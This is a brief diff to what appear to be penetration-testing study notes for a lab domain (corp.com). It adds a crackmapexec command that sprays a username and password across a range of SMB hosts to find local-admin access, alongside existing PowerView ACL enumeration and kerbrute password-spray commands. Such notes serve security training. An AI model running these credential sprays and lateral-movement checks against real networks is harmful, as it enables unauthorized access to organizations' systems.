@@ -78,6 +78,9 @@ Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -e
 in linux
 crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
 
+//check  A user have access to A machine, and if have local admin(Pwn3d!)
+crackmapexec smb 192.168.149.70-75 -u mike -p "Darkness1099\!" -d corp.com --continue-on-success
+
 in target Win
 .\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
 ```
